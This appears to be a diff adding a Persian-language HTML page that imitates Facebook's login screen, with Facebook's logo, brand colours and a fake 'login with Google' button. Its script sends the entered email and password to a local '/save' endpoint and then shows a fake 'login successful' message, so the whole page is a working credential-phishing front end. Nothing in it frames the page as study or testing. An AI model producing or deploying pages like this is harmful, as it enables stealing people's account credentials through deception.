@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - ورود</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Vazirmatn', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .logo img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    .login-box {
+      background-color: white;
+      padding: 25px;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      font-size: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    .login-box input.focused {
+      border-color: #42b72a !important;
+    }
+
+    .login-box input.invalid {
+      border-color: #f02849 !important;
+    }
+
+    .login-box button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    .login-box .create-account {
+      background-color: #42b72a;
+      margin-top: 15px;
+    }
+
+    .login-box button:hover {
+      opacity: 0.95;
+    }
+
+    .link {
+      display: block;
+      text-align: center;
+      margin-top: 15px;
+      text-decoration: none;
+      color: #1877f2;
+      font-size: 14px;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    hr {
+      margin: 20px 0;
+      border: none;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .google-login-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid #dddfe2;
+      padding: 12px;
+      border-radius: 6px;
+      margin-top: 15px;
+      cursor: pointer;
+      background-color: #ffffff;
+      transition: background-color 0.3s;
+    }
+
+    .google-login-button:hover {
+      background-color: #f8f8f8;
+    }
+
+    .google-login-button svg {
+      width: 26px;
+      height: 26px;
+      margin-left: 10px;
+    }
+
+    .google-login-button span {
+      font-size: 16px;
+      color: #333;
+    }
+
+    @media (max-width: 480px) {
+      .logo img {
+        width: 80px;
+      }
+
+      .login-box {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" />
+    </div>
+    <div class="login-box">
+      <form id="loginForm" novalidate>
+        <input type="text" id="email" name="email" placeholder="ایمیل یا شماره تلفن" required />
+        <div id="emailError" class="error"></div>
+
+        <input type="password" id="password" name="password" placeholder="رمز عبور" required />
+        <div id="passError" class="error"></div>
+
+        <button type="submit">ورود</button>
+        <a href="#" class="link">رمز عبور را فراموش کرده‌اید؟</a>
+        <hr>
+        <button type="button" class="create-account">ساخت حساب جدید</button>
+      </form>
+
+      <!-- دکمه ورود با گوگل -->
+      <div class="google-login-button">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+          <path fill="#EA4335" d="M24 9.5c3.15 0 5.36 1.35 6.6 2.5l4.9-4.9C32.3 4.4 28.4 3 24 3 14.9 3 7.4 9.5 5.2 18h6.9c1.4-5.1 6-8.5 11.9-8.5z"/>
+          <path fill="#34A853" d="M9.1 28.5C7.6 25.4 7.6 21.6 9.1 18.5H2.2C-.3 24.2-.3 30.8 2.2 36.5l6.9-8z"/>
+          <path fill="#FBBC05" d="M24 44.5c5.6 0 10.2-1.8 13.5-4.8l-6.3-5.2c-2.2 1.5-5 2.3-8.1 2.3-5.9 0-10.9-4-12.6-9.5H2.2c2.2 8.6 10 15.2 18.8 15.2z"/>
+          <path fill="#4285F4" d="M46.5 24c0-1.3-.1-2.7-.4-4H24v7.5h12.6c-1 2.7-2.7 4.9-5 6.4l6.3 5.2c3.7-3.4 5.9-8.4 5.9-14.1z"/>
+        </svg>
+        <span>ورود با گوگل</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const emailError = document.getElementById("emailError");
+    const passError = document.getElementById("passError");
+
+    function validateEmailOrPhone(value) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^[+]*[0-9]{1,4}[0-9]{7,15}$/;
+      return emailRegex.test(value) || phoneRegex.test(value);
+    }
+
+    function handleFocus(event) {
+      const input = event.target;
+      input.classList.add("focused");
+      input.classList.remove("invalid");
+    }
+
+    function handleBlur(event) {
+      event.target.classList.remove("focused");
+    }
+
+    emailInput.addEventListener("focus", handleFocus);
+    passwordInput.addEventListener("focus", handleFocus);
+
+    emailInput.addEventListener("blur", handleBlur);
+    passwordInput.addEventListener("blur", handleBlur);
+
+    emailInput.addEventListener("input", () => {
+      const isValid = validateEmailOrPhone(emailInput.value.trim());
+      emailError.textContent = "";
+      emailInput.classList.toggle("invalid", !isValid && emailInput.value.trim() !== "");
+    });
+
+    passwordInput.addEventListener("input", () => {
+      passError.textContent = "";
+      passwordInput.classList.remove("invalid");
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      let valid = true;
+
+      if (!validateEmailOrPhone(email)) {
+        emailError.textContent = "ایمیل یا شماره معتبر نیست.";
+        emailInput.classList.add("invalid");
+        valid = false;
+      }
+
+      if (password === "") {
+        passError.textContent = "لطفا رمز عبور را وارد کنید.";
+        passwordInput.classList.add("invalid");
+        valid = false;
+      }
+
+      if (valid) {
+        fetch("http://127.0.0.1:5000/save", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+        })
+        .then(res => res.text())
+        .then(data => {
+          if (data === "saved") {
+            alert("ورود موفقیت‌آمیز بود!");
+            emailInput.value = "";
+            passwordInput.value = "";
+          }
+        })
+        .catch(err => {
+          alert("خطا در اتصال به سرور!");
+          console.error(err);
+        });
+      }
+    });
+  </script>
+</body>
+</html>
